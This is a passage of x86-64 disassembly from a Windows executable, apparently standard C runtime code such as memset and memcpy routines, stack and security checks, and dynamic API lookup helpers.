   1400049a7:	4d 03 c1             	add    %r9,%r8
   1400049aa:	49 81 f8 80 00 00 00 	cmp    $0x80,%r8
   1400049b1:	76 4b                	jbe    0x1400049fe
   1400049b3:	66 66 66 66 66 0f 1f 	data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   1400049ba:	84 00 00 00 00 00 
   1400049c0:	66 0f 7f 01          	movdqa %xmm0,(%rcx)
   1400049c4:	66 0f 7f 41 10       	movdqa %xmm0,0x10(%rcx)
   1400049c9:	66 0f 7f 41 20       	movdqa %xmm0,0x20(%rcx)
   1400049ce:	66 0f 7f 41 30       	movdqa %xmm0,0x30(%rcx)
   1400049d3:	66 0f 7f 41 40       	movdqa %xmm0,0x40(%rcx)
   1400049d8:	66 0f 7f 41 50       	movdqa %xmm0,0x50(%rcx)
   1400049dd:	66 0f 7f 41 60       	movdqa %xmm0,0x60(%rcx)
   1400049e2:	66 0f 7f 41 70       	movdqa %xmm0,0x70(%rcx)
   1400049e7:	48 81 c1 80 00 00 00 	add    $0x80,%rcx
   1400049ee:	49 81 e8 80 00 00 00 	sub    $0x80,%r8
   1400049f5:	49 81 f8 80 00 00 00 	cmp    $0x80,%r8
   1400049fc:	73 c2                	jae    0x1400049c0
   1400049fe:	4d 8d 48 0f          	lea    0xf(%r8),%r9
   140004a02:	49 83 e1 f0          	and    $0xfffffffffffffff0,%r9
   140004a06:	4d 8b d9             	mov    %r9,%r11
   140004a09:	49 c1 eb 04          	shr    $0x4,%r11
   140004a0d:	47 8b 9c 9a 88 d0 01 	mov    0x1d088(%r10,%r11,4),%r11d
   140004a14:	00 
   140004a15:	4d 03 da             	add    %r10,%r11
   140004a18:	41 ff e3             	jmp    *%r11
   140004a1b:	f3 42 0f 7f 44 09 80 	movdqu %xmm0,-0x80(%rcx,%r9,1)
   140004a22:	f3 42 0f 7f 44 09 90 	movdqu %xmm0,-0x70(%rcx,%r9,1)
   140004a29:	f3 42 0f 7f 44 09 a0 	movdqu %xmm0,-0x60(%rcx,%r9,1)
   140004a30:	f3 42 0f 7f 44 09 b0 	movdqu %xmm0,-0x50(%rcx,%r9,1)
   140004a37:	f3 42 0f 7f 44 09 c0 	movdqu %xmm0,-0x40(%rcx,%r9,1)
   140004a3e:	f3 42 0f 7f 44 09 d0 	movdqu %xmm0,-0x30(%rcx,%r9,1)
   140004a45:	f3 42 0f 7f 44 09 e0 	movdqu %xmm0,-0x20(%rcx,%r9,1)
   140004a4c:	f3 42 0f 7f 44 01 f0 	movdqu %xmm0,-0x10(%rcx,%r8,1)
   140004a53:	f3 0f 7f 00          	movdqu %xmm0,(%rax)
   140004a57:	c3                   	ret
   140004a58:	cc                   	int3
   140004a59:	cc                   	int3
   140004a5a:	cc                   	int3
   140004a5b:	cc                   	int3
   140004a5c:	cc                   	int3
   140004a5d:	cc                   	int3
   140004a5e:	cc                   	int3
   140004a5f:	cc                   	int3
   140004a60:	cc                   	int3
   140004a61:	cc                   	int3
   140004a62:	cc                   	int3
   140004a63:	cc                   	int3
   140004a64:	cc                   	int3
   140004a65:	cc                   	int3
   140004a66:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140004a6d:	00 00 00 
   140004a70:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140004a75:	48 89 54 24 18       	mov    %rdx,0x18(%rsp)
   140004a7a:	44 89 44 24 10       	mov    %r8d,0x10(%rsp)
   140004a7f:	49 c7 c1 20 05 93 19 	mov    $0x19930520,%r9
   140004a86:	eb 08                	jmp    0x140004a90
   140004a88:	cc                   	int3
   140004a89:	cc                   	int3
   140004a8a:	cc                   	int3
   140004a8b:	cc                   	int3
   140004a8c:	cc                   	int3
   140004a8d:	cc                   	int3
   140004a8e:	66 90                	xchg   %ax,%ax
   140004a90:	c3                   	ret
   140004a91:	cc                   	int3
   140004a92:	cc                   	int3
   140004a93:	cc                   	int3
   140004a94:	cc                   	int3
   140004a95:	cc                   	int3
   140004a96:	cc                   	int3
   140004a97:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140004a9e:	00 00 
   140004aa0:	c3                   	ret
   140004aa1:	cc                   	int3
   140004aa2:	cc                   	int3
   140004aa3:	cc                   	int3
   140004aa4:	48 8b 05 9d a9 00 00 	mov    0xa99d(%rip),%rax        # 0x14000f448
   140004aab:	48 8d 15 b6 f0 ff ff 	lea    -0xf4a(%rip),%rdx        # 0x140003b68
   140004ab2:	48 3b c2             	cmp    %rdx,%rax
   140004ab5:	74 23                	je     0x140004ada
   140004ab7:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
   140004abe:	00 00 
   140004ac0:	48 8b 89 98 00 00 00 	mov    0x98(%rcx),%rcx
   140004ac7:	48 3b 48 10          	cmp    0x10(%rax),%rcx
   140004acb:	72 06                	jb     0x140004ad3
   140004acd:	48 3b 48 08          	cmp    0x8(%rax),%rcx
   140004ad1:	76 07                	jbe    0x140004ada
   140004ad3:	b9 0d 00 00 00       	mov    $0xd,%ecx
   140004ad8:	cd 29                	int    $0x29
   140004ada:	c3                   	ret
   140004adb:	cc                   	int3
   140004adc:	48 83 ec 28          	sub    $0x28,%rsp
   140004ae0:	48 85 c9             	test   %rcx,%rcx
   140004ae3:	74 11                	je     0x140004af6
   140004ae5:	48 8d 05 94 65 01 00 	lea    0x16594(%rip),%rax        # 0x14001b080
   140004aec:	48 3b c8             	cmp    %rax,%rcx
   140004aef:	74 05                	je     0x140004af6
   140004af1:	e8 d2 1b 00 00       	call   0x1400066c8
   140004af6:	48 83 c4 28          	add    $0x28,%rsp
   140004afa:	c3                   	ret
   140004afb:	cc                   	int3
   140004afc:	48 83 ec 28          	sub    $0x28,%rsp
   140004b00:	e8 13 00 00 00       	call   0x140004b18
   140004b05:	48 85 c0             	test   %rax,%rax
   140004b08:	74 05                	je     0x140004b0f
   140004b0a:	48 83 c4 28          	add    $0x28,%rsp
   140004b0e:	c3                   	ret
   140004b0f:	e8 bc 21 00 00       	call   0x140006cd0
   140004b14:	cc                   	int3
   140004b15:	cc                   	int3
   140004b16:	cc                   	int3
   140004b17:	cc                   	int3
   140004b18:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004b1d:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140004b22:	57                   	push   %rdi
   140004b23:	48 83 ec 20          	sub    $0x20,%rsp
   140004b27:	83 3d 02 55 01 00 ff 	cmpl   $0xffffffff,0x15502(%rip)        # 0x14001a030
   140004b2e:	75 07                	jne    0x140004b37
   140004b30:	33 c0                	xor    %eax,%eax
   140004b32:	e9 90 00 00 00       	jmp    0x140004bc7
   140004b37:	ff 15 93 a5 00 00    	call   *0xa593(%rip)        # 0x14000f0d0
   140004b3d:	8b 0d ed 54 01 00    	mov    0x154ed(%rip),%ecx        # 0x14001a030
   140004b43:	8b f8                	mov    %eax,%edi
   140004b45:	e8 5a 03 00 00       	call   0x140004ea4
   140004b4a:	48 83 ca ff          	or     $0xffffffffffffffff,%rdx
   140004b4e:	33 f6                	xor    %esi,%esi
   140004b50:	48 3b c2             	cmp    %rdx,%rax
   140004b53:	74 67                	je     0x140004bbc
   140004b55:	48 85 c0             	test   %rax,%rax
   140004b58:	74 05                	je     0x140004b5f
   140004b5a:	48 8b f0             	mov    %rax,%rsi
   140004b5d:	eb 5d                	jmp    0x140004bbc
   140004b5f:	8b 0d cb 54 01 00    	mov    0x154cb(%rip),%ecx        # 0x14001a030
   140004b65:	e8 82 03 00 00       	call   0x140004eec
   140004b6a:	85 c0                	test   %eax,%eax
   140004b6c:	74 4e                	je     0x140004bbc
   140004b6e:	ba 80 00 00 00       	mov    $0x80,%edx
   140004b73:	8d 4a 81             	lea    -0x7f(%rdx),%ecx
   140004b76:	e8 ad 21 00 00       	call   0x140006d28
   140004b7b:	8b 0d af 54 01 00    	mov    0x154af(%rip),%ecx        # 0x14001a030
   140004b81:	48 8b d8             	mov    %rax,%rbx
   140004b84:	48 85 c0             	test   %rax,%rax
   140004b87:	74 24                	je     0x140004bad
   140004b89:	48 8b d0             	mov    %rax,%rdx
   140004b8c:	e8 5b 03 00 00       	call   0x140004eec
   140004b91:	85 c0                	test   %eax,%eax
   140004b93:	74 12                	je     0x140004ba7
   140004b95:	48 8b c3             	mov    %rbx,%rax
   140004b98:	c7 43 78 fe ff ff ff 	movl   $0xfffffffe,0x78(%rbx)
   140004b9f:	48 8b de             	mov    %rsi,%rbx
   140004ba2:	48 8b f0             	mov    %rax,%rsi
   140004ba5:	eb 0d                	jmp    0x140004bb4
   140004ba7:	8b 0d 83 54 01 00    	mov    0x15483(%rip),%ecx        # 0x14001a030
   140004bad:	33 d2                	xor    %edx,%edx
   140004baf:	e8 38 03 00 00       	call   0x140004eec
   140004bb4:	48 8b cb             	mov    %rbx,%rcx
   140004bb7:	e8 0c 1b 00 00       	call   0x1400066c8
   140004bbc:	8b cf                	mov    %edi,%ecx
   140004bbe:	ff 15 34 a7 00 00    	call   *0xa734(%rip)        # 0x14000f2f8
   140004bc4:	48 8b c6             	mov    %rsi,%rax
   140004bc7:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004bcc:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140004bd1:	48 83 c4 20          	add    $0x20,%rsp
   140004bd5:	5f                   	pop    %rdi
   140004bd6:	c3                   	ret
   140004bd7:	cc                   	int3
   140004bd8:	48 83 ec 28          	sub    $0x28,%rsp
   140004bdc:	48 8d 0d f9 fe ff ff 	lea    -0x107(%rip),%rcx        # 0x140004adc
   140004be3:	e8 2c 02 00 00       	call   0x140004e14
   140004be8:	89 05 42 54 01 00    	mov    %eax,0x15442(%rip)        # 0x14001a030
   140004bee:	83 f8 ff             	cmp    $0xffffffff,%eax
   140004bf1:	74 25                	je     0x140004c18
   140004bf3:	48 8d 15 86 64 01 00 	lea    0x16486(%rip),%rdx        # 0x14001b080
   140004bfa:	8b c8                	mov    %eax,%ecx
   140004bfc:	e8 eb 02 00 00       	call   0x140004eec
   140004c01:	85 c0                	test   %eax,%eax
   140004c03:	74 0e                	je     0x140004c13
   140004c05:	c7 05 e9 64 01 00 fe 	movl   $0xfffffffe,0x164e9(%rip)        # 0x14001b0f8
   140004c0c:	ff ff ff 
   140004c0f:	b0 01                	mov    $0x1,%al
   140004c11:	eb 07                	jmp    0x140004c1a
   140004c13:	e8 08 00 00 00       	call   0x140004c20
   140004c18:	32 c0                	xor    %al,%al
   140004c1a:	48 83 c4 28          	add    $0x28,%rsp
   140004c1e:	c3                   	ret
   140004c1f:	cc                   	int3
   140004c20:	48 83 ec 28          	sub    $0x28,%rsp
   140004c24:	8b 0d 06 54 01 00    	mov    0x15406(%rip),%ecx        # 0x14001a030
   140004c2a:	83 f9 ff             	cmp    $0xffffffff,%ecx
   140004c2d:	74 0c                	je     0x140004c3b
   140004c2f:	e8 28 02 00 00       	call   0x140004e5c
   140004c34:	83 0d f5 53 01 00 ff 	orl    $0xffffffff,0x153f5(%rip)        # 0x14001a030
   140004c3b:	b0 01                	mov    $0x1,%al
   140004c3d:	48 83 c4 28          	add    $0x28,%rsp
   140004c41:	c3                   	ret
   140004c42:	cc                   	int3
   140004c43:	cc                   	int3
   140004c44:	40 53                	rex push %rbx
   140004c46:	48 83 ec 20          	sub    $0x20,%rsp
   140004c4a:	33 db                	xor    %ebx,%ebx
   140004c4c:	48 8d 15 ad 64 01 00 	lea    0x164ad(%rip),%rdx        # 0x14001b100
   140004c53:	45 33 c0             	xor    %r8d,%r8d
   140004c56:	48 8d 0c 9b          	lea    (%rbx,%rbx,4),%rcx
   140004c5a:	48 8d 0c ca          	lea    (%rdx,%rcx,8),%rcx
   140004c5e:	ba a0 0f 00 00       	mov    $0xfa0,%edx
   140004c63:	e8 d8 02 00 00       	call   0x140004f40
   140004c68:	85 c0                	test   %eax,%eax
   140004c6a:	74 11                	je     0x140004c7d
   140004c6c:	ff 05 b6 64 01 00    	incl   0x164b6(%rip)        # 0x14001b128
   140004c72:	ff c3                	inc    %ebx
   140004c74:	83 fb 01             	cmp    $0x1,%ebx
   140004c77:	72 d3                	jb     0x140004c4c
   140004c79:	b0 01                	mov    $0x1,%al
   140004c7b:	eb 07                	jmp    0x140004c84
   140004c7d:	e8 0a 00 00 00       	call   0x140004c8c
   140004c82:	32 c0                	xor    %al,%al
   140004c84:	48 83 c4 20          	add    $0x20,%rsp
   140004c88:	5b                   	pop    %rbx
   140004c89:	c3                   	ret
   140004c8a:	cc                   	int3
   140004c8b:	cc                   	int3
   140004c8c:	40 53                	rex push %rbx
   140004c8e:	48 83 ec 20          	sub    $0x20,%rsp
   140004c92:	8b 1d 90 64 01 00    	mov    0x16490(%rip),%ebx        # 0x14001b128
   140004c98:	eb 1d                	jmp    0x140004cb7
   140004c9a:	48 8d 05 5f 64 01 00 	lea    0x1645f(%rip),%rax        # 0x14001b100
   140004ca1:	ff cb                	dec    %ebx
   140004ca3:	48 8d 0c 9b          	lea    (%rbx,%rbx,4),%rcx
   140004ca7:	48 8d 0c c8          	lea    (%rax,%rcx,8),%rcx
   140004cab:	ff 15 5f a6 00 00    	call   *0xa65f(%rip)        # 0x14000f310
   140004cb1:	ff 0d 71 64 01 00    	decl   0x16471(%rip)        # 0x14001b128
   140004cb7:	85 db                	test   %ebx,%ebx
   140004cb9:	75 df                	jne    0x140004c9a
   140004cbb:	b0 01                	mov    $0x1,%al
   140004cbd:	48 83 c4 20          	add    $0x20,%rsp
   140004cc1:	5b                   	pop    %rbx
   140004cc2:	c3                   	ret
   140004cc3:	cc                   	int3
   140004cc4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004cc9:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140004cce:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140004cd3:	57                   	push   %rdi
   140004cd4:	41 54                	push   %r12
   140004cd6:	41 55                	push   %r13
   140004cd8:	41 56                	push   %r14
   140004cda:	41 57                	push   %r15
   140004cdc:	48 83 ec 20          	sub    $0x20,%rsp
   140004ce0:	8b f9                	mov    %ecx,%edi
   140004ce2:	4c 8d 3d 17 b3 ff ff 	lea    -0x4ce9(%rip),%r15        # 0x140000000
   140004ce9:	49 83 ce ff          	or     $0xffffffffffffffff,%r14
   140004ced:	4d 8b e1             	mov    %r9,%r12
   140004cf0:	49 8b e8             	mov    %r8,%rbp
   140004cf3:	4c 8b ea             	mov    %rdx,%r13
   140004cf6:	49 8b 84 ff b0 b1 01 	mov    0x1b1b0(%r15,%rdi,8),%rax
   140004cfd:	00 
   140004cfe:	90                   	nop
   140004cff:	49 3b c6             	cmp    %r14,%rax
   140004d02:	0f 84 eb 00 00 00    	je     0x140004df3
   140004d08:	48 85 c0             	test   %rax,%rax
   140004d0b:	0f 85 e4 00 00 00    	jne    0x140004df5
   140004d11:	4d 3b c1             	cmp    %r9,%r8
   140004d14:	0f 84 d1 00 00 00    	je     0x140004deb
   140004d1a:	8b 75 00             	mov    0x0(%rbp),%esi
   140004d1d:	49 8b 9c f7 98 b1 01 	mov    0x1b198(%r15,%rsi,8),%rbx
   140004d24:	00 
   140004d25:	90                   	nop
   140004d26:	48 85 db             	test   %rbx,%rbx
   140004d29:	74 0b                	je     0x140004d36
   140004d2b:	49 3b de             	cmp    %r14,%rbx
   140004d2e:	0f 85 99 00 00 00    	jne    0x140004dcd
   140004d34:	eb 6b                	jmp    0x140004da1
   140004d36:	4d 8b bc f7 b8 03 01 	mov    0x103b8(%r15,%rsi,8),%r15
   140004d3d:	00 
   140004d3e:	33 d2                	xor    %edx,%edx
   140004d40:	49 8b cf             	mov    %r15,%rcx
   140004d43:	41 b8 00 08 00 00    	mov    $0x800,%r8d
   140004d49:	ff 15 f1 a5 00 00    	call   *0xa5f1(%rip)        # 0x14000f340
   140004d4f:	48 8b d8             	mov    %rax,%rbx
   140004d52:	48 85 c0             	test   %rax,%rax
   140004d55:	75 56                	jne    0x140004dad
   140004d57:	ff 15 73 a3 00 00    	call   *0xa373(%rip)        # 0x14000f0d0
   140004d5d:	83 f8 57             	cmp    $0x57,%eax
   140004d60:	75 2d                	jne    0x140004d8f
   140004d62:	44 8d 43 07          	lea    0x7(%rbx),%r8d
   140004d66:	49 8b cf             	mov    %r15,%rcx
   140004d69:	48 8d 15 f8 b6 00 00 	lea    0xb6f8(%rip),%rdx        # 0x140010468
   140004d70:	e8 4b 20 00 00       	call   0x140006dc0
   140004d75:	85 c0                	test   %eax,%eax
   140004d77:	74 16                	je     0x140004d8f
   140004d79:	45 33 c0             	xor    %r8d,%r8d
   140004d7c:	33 d2                	xor    %edx,%edx
   140004d7e:	49 8b cf             	mov    %r15,%rcx
   140004d81:	ff 15 b9 a5 00 00    	call   *0xa5b9(%rip)        # 0x14000f340
   140004d87:	48 8b d8             	mov    %rax,%rbx
   140004d8a:	48 85 c0             	test   %rax,%rax
   140004d8d:	75 1e                	jne    0x140004dad
   140004d8f:	49 8b c6             	mov    %r14,%rax
   140004d92:	4c 8d 3d 67 b2 ff ff 	lea    -0x4d99(%rip),%r15        # 0x140000000
   140004d99:	49 87 84 f7 98 b1 01 	xchg   %rax,0x1b198(%r15,%rsi,8)
   140004da0:	00 
   140004da1:	48 83 c5 04          	add    $0x4,%rbp
   140004da5:	49 3b ec             	cmp    %r12,%rbp
   140004da8:	e9 67 ff ff ff       	jmp    0x140004d14
   140004dad:	48 8b c3             	mov    %rbx,%rax
   140004db0:	4c 8d 3d 49 b2 ff ff 	lea    -0x4db7(%rip),%r15        # 0x140000000
   140004db7:	49 87 84 f7 98 b1 01 	xchg   %rax,0x1b198(%r15,%rsi,8)
   140004dbe:	00 
   140004dbf:	48 85 c0             	test   %rax,%rax
   140004dc2:	74 09                	je     0x140004dcd
   140004dc4:	48 8b cb             	mov    %rbx,%rcx
   140004dc7:	ff 15 73 a3 00 00    	call   *0xa373(%rip)        # 0x14000f140
   140004dcd:	49 8b d5             	mov    %r13,%rdx
   140004dd0:	48 8b cb             	mov    %rbx,%rcx
   140004dd3:	ff 15 2f a3 00 00    	call   *0xa32f(%rip)        # 0x14000f108
   140004dd9:	48 85 c0             	test   %rax,%rax
   140004ddc:	74 0d                	je     0x140004deb
   140004dde:	48 8b c8             	mov    %rax,%rcx
   140004de1:	49 87 8c ff b0 b1 01 	xchg   %rcx,0x1b1b0(%r15,%rdi,8)
   140004de8:	00 
   140004de9:	eb 0a                	jmp    0x140004df5
   140004deb:	4d 87 b4 ff b0 b1 01 	xchg   %r14,0x1b1b0(%r15,%rdi,8)
   140004df2:	00 
   140004df3:	33 c0                	xor    %eax,%eax
   140004df5:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140004dfa:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   140004dff:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   140004e04:	48 83 c4 20          	add    $0x20,%rsp
   140004e08:	41 5f                	pop    %r15
   140004e0a:	41 5e                	pop    %r14
   140004e0c:	41 5d                	pop    %r13
   140004e0e:	41 5c                	pop    %r12
   140004e10:	5f                   	pop    %rdi
   140004e11:	c3                   	ret
   140004e12:	cc                   	int3
   140004e13:	cc                   	int3
   140004e14:	40 53                	rex push %rbx
   140004e16:	48 83 ec 20          	sub    $0x20,%rsp
   140004e1a:	48 8b d9             	mov    %rcx,%rbx
   140004e1d:	4c 8d 0d 5c b6 00 00 	lea    0xb65c(%rip),%r9        # 0x140010480
   140004e24:	33 c9                	xor    %ecx,%ecx
   140004e26:	4c 8d 05 4b b6 00 00 	lea    0xb64b(%rip),%r8        # 0x140010478
   140004e2d:	48 8d 15 4c b6 00 00 	lea    0xb64c(%rip),%rdx        # 0x140010480
   140004e34:	e8 8b fe ff ff       	call   0x140004cc4
   140004e39:	48 85 c0             	test   %rax,%rax
   140004e3c:	74 0f                	je     0x140004e4d
   140004e3e:	48 8b cb             	mov    %rbx,%rcx
   140004e41:	48 83 c4 20          	add    $0x20,%rsp
   140004e45:	5b                   	pop    %rbx
   140004e46:	48 ff 25 0b a6 00 00 	rex.W jmp *0xa60b(%rip)        # 0x14000f458
   140004e4d:	48 83 c4 20          	add    $0x20,%rsp
   140004e51:	5b                   	pop    %rbx
   140004e52:	48 ff 25 c7 a4 00 00 	rex.W jmp *0xa4c7(%rip)        # 0x14000f320
   140004e59:	cc                   	int3
   140004e5a:	cc                   	int3
   140004e5b:	cc                   	int3
   140004e5c:	40 53                	rex push %rbx
   140004e5e:	48 83 ec 20          	sub    $0x20,%rsp
   140004e62:	8b d9                	mov    %ecx,%ebx
   140004e64:	4c 8d 0d 2d b6 00 00 	lea    0xb62d(%rip),%r9        # 0x140010498
   140004e6b:	b9 01 00 00 00       	mov    $0x1,%ecx
   140004e70:	4c 8d 05 19 b6 00 00 	lea    0xb619(%rip),%r8        # 0x140010490
   140004e77:	48 8d 15 1a b6 00 00 	lea    0xb61a(%rip),%rdx        # 0x140010498
   140004e7e:	e8 41 fe ff ff       	call   0x140004cc4
   140004e83:	8b cb                	mov    %ebx,%ecx
   140004e85:	48 85 c0             	test   %rax,%rax
   140004e88:	74 0c                	je     0x140004e96
   140004e8a:	48 83 c4 20          	add    $0x20,%rsp
   140004e8e:	5b                   	pop    %rbx
   140004e8f:	48 ff 25 c2 a5 00 00 	rex.W jmp *0xa5c2(%rip)        # 0x14000f458
   140004e96:	48 83 c4 20          	add    $0x20,%rsp
   140004e9a:	5b                   	pop    %rbx
   140004e9b:	48 ff 25 96 a4 00 00 	rex.W jmp *0xa496(%rip)        # 0x14000f338
   140004ea2:	cc                   	int3
   140004ea3:	cc                   	int3
   140004ea4:	40 53                	rex push %rbx
   140004ea6:	48 83 ec 20          	sub    $0x20,%rsp
   140004eaa:	8b d9                	mov    %ecx,%ebx
   140004eac:	4c 8d 0d f5 b5 00 00 	lea    0xb5f5(%rip),%r9        # 0x1400104a8
   140004eb3:	b9 02 00 00 00       	mov    $0x2,%ecx
   140004eb8:	4c 8d 05 e1 b5 00 00 	lea    0xb5e1(%rip),%r8        # 0x1400104a0
   140004ebf:	48 8d 15 e2 b5 00 00 	lea    0xb5e2(%rip),%rdx        # 0x1400104a8
   140004ec6:	e8 f9 fd ff ff       	call   0x140004cc4
   140004ecb:	8b cb                	mov    %ebx,%ecx
   140004ecd:	48 85 c0             	test   %rax,%rax
   140004ed0:	74 0c                	je     0x140004ede
   140004ed2:	48 83 c4 20          	add    $0x20,%rsp
   140004ed6:	5b                   	pop    %rbx
   140004ed7:	48 ff 25 7a a5 00 00 	rex.W jmp *0xa57a(%rip)        # 0x14000f458
   140004ede:	48 83 c4 20          	add    $0x20,%rsp
   140004ee2:	5b                   	pop    %rbx
   140004ee3:	48 ff 25 3e a4 00 00 	rex.W jmp *0xa43e(%rip)        # 0x14000f328
   140004eea:	cc                   	int3
   140004eeb:	cc                   	int3
   140004eec:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004ef1:	57                   	push   %rdi
   140004ef2:	48 83 ec 20          	sub    $0x20,%rsp
   140004ef6:	48 8b da             	mov    %rdx,%rbx
   140004ef9:	4c 8d 0d c0 b5 00 00 	lea    0xb5c0(%rip),%r9        # 0x1400104c0
   140004f00:	8b f9                	mov    %ecx,%edi
   140004f02:	48 8d 15 b7 b5 00 00 	lea    0xb5b7(%rip),%rdx        # 0x1400104c0
   140004f09:	b9 03 00 00 00       	mov    $0x3,%ecx
   140004f0e:	4c 8d 05 a3 b5 00 00 	lea    0xb5a3(%rip),%r8        # 0x1400104b8
   140004f15:	e8 aa fd ff ff       	call   0x140004cc4
   140004f1a:	48 8b d3             	mov    %rbx,%rdx
   140004f1d:	8b cf                	mov    %edi,%ecx
   140004f1f:	48 85 c0             	test   %rax,%rax
   140004f22:	74 08                	je     0x140004f2c
   140004f24:	ff 15 2e a5 00 00    	call   *0xa52e(%rip)        # 0x14000f458
   140004f2a:	eb 06                	jmp    0x140004f32
   140004f2c:	ff 15 fe a3 00 00    	call   *0xa3fe(%rip)        # 0x14000f330
   140004f32:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004f37:	48 83 c4 20          	add    $0x20,%rsp
   140004f3b:	5f                   	pop    %rdi
   140004f3c:	c3                   	ret
   140004f3d:	cc                   	int3
   140004f3e:	cc                   	int3
   140004f3f:	cc                   	int3
   140004f40:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004f45:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140004f4a:	57                   	push   %rdi
   140004f4b:	48 83 ec 20          	sub    $0x20,%rsp
   140004f4f:	41 8b f0             	mov    %r8d,%esi
   140004f52:	4c 8d 0d 7f b5 00 00 	lea    0xb57f(%rip),%r9        # 0x1400104d8
   140004f59:	8b da                	mov    %edx,%ebx
   140004f5b:	4c 8d 05 6e b5 00 00 	lea    0xb56e(%rip),%r8        # 0x1400104d0
   140004f62:	48 8b f9             	mov    %rcx,%rdi
   140004f65:	48 8d 15 6c b5 00 00 	lea    0xb56c(%rip),%rdx        # 0x1400104d8
   140004f6c:	b9 04 00 00 00       	mov    $0x4,%ecx
   140004f71:	e8 4e fd ff ff       	call   0x140004cc4
   140004f76:	8b d3                	mov    %ebx,%edx
   140004f78:	48 8b cf             	mov    %rdi,%rcx
   140004f7b:	48 85 c0             	test   %rax,%rax
   140004f7e:	74 0b                	je     0x140004f8b
   140004f80:	44 8b c6             	mov    %esi,%r8d
   140004f83:	ff 15 cf a4 00 00    	call   *0xa4cf(%rip)        # 0x14000f458
   140004f89:	eb 06                	jmp    0x140004f91
   140004f8b:	ff 15 87 a3 00 00    	call   *0xa387(%rip)        # 0x14000f318
   140004f91:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004f96:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140004f9b:	48 83 c4 20          	add    $0x20,%rsp
   140004f9f:	5f                   	pop    %rdi
   140004fa0:	c3                   	ret
   140004fa1:	cc                   	int3
   140004fa2:	cc                   	int3
   140004fa3:	cc                   	int3
   140004fa4:	cc                   	int3
   140004fa5:	cc                   	int3
   140004fa6:	cc                   	int3
   140004fa7:	cc                   	int3
   140004fa8:	cc                   	int3
   140004fa9:	cc                   	int3
   140004faa:	cc                   	int3
   140004fab:	cc                   	int3
   140004fac:	cc                   	int3
   140004fad:	cc                   	int3
   140004fae:	cc                   	int3
   140004faf:	cc                   	int3
   140004fb0:	cc                   	int3
   140004fb1:	cc                   	int3
   140004fb2:	cc                   	int3
   140004fb3:	cc                   	int3
   140004fb4:	cc                   	int3
   140004fb5:	cc                   	int3
   140004fb6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140004fbd:	00 00 00 
   140004fc0:	57                   	push   %rdi
   140004fc1:	56                   	push   %rsi
   140004fc2:	48 8b f9             	mov    %rcx,%rdi
   140004fc5:	48 8b f2             	mov    %rdx,%rsi
   140004fc8:	49 8b c8             	mov    %r8,%rcx
   140004fcb:	f3 a4                	rep movsb (%rsi),(%rdi)
   140004fcd:	5e                   	pop    %rsi
   140004fce:	5f                   	pop    %rdi
   140004fcf:	c3                   	ret
   140004fd0:	cc                   	int3
   140004fd1:	cc                   	int3
   140004fd2:	cc                   	int3
   140004fd3:	cc                   	int3
   140004fd4:	cc                   	int3
   140004fd5:	cc                   	int3
   140004fd6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140004fdd:	00 00 00 
   140004fe0:	48 8b c1             	mov    %rcx,%rax
   140004fe3:	4c 8d 15 16 b0 ff ff 	lea    -0x4fea(%rip),%r10        # 0x140000000
   140004fea:	49 83 f8 0f          	cmp    $0xf,%r8
   140004fee:	0f 87 0c 01 00 00    	ja     0x140005100
   140004ff4:	66 66 66 66 0f 1f 84 	data16 data16 data16 nopw 0x0(%rax,%rax,1)
   140004ffb:	00 00 00 00 00 
   140005000:	47 8b 8c 82 b0 d0 01 	mov    0x1d0b0(%r10,%r8,4),%r9d
   140005007:	00 
   140005008:	4d 03 ca             	add    %r10,%r9
   14000500b:	41 ff e1             	jmp    *%r9
   14000500e:	c3                   	ret
   14000500f:	90                   	nop
   140005010:	4c 8b 02             	mov    (%rdx),%r8
   140005013:	8b 4a 08             	mov    0x8(%rdx),%ecx
   140005016:	44 0f b7 4a 0c       	movzwl 0xc(%rdx),%r9d
   14000501b:	44 0f b6 52 0e       	movzbl 0xe(%rdx),%r10d
   140005020:	4c 89 00             	mov    %r8,(%rax)
   140005023:	89 48 08             	mov    %ecx,0x8(%rax)
   140005026:	66 44 89 48 0c       	mov    %r9w,0xc(%rax)
   14000502b:	44 88 50 0e          	mov    %r10b,0xe(%rax)
   14000502f:	c3                   	ret
   140005030:	4c 8b 02             	mov    (%rdx),%r8
   140005033:	0f b7 4a 08          	movzwl 0x8(%rdx),%ecx
   140005037:	44 0f b6 4a 0a       	movzbl 0xa(%rdx),%r9d
   14000503c:	4c 89 00             	mov    %r8,(%rax)
   14000503f:	66 89 48 08          	mov    %cx,0x8(%rax)
   140005043:	44 88 48 0a          	mov    %r9b,0xa(%rax)
   140005047:	c3                   	ret
   140005048:	0f b7 0a             	movzwl (%rdx),%ecx
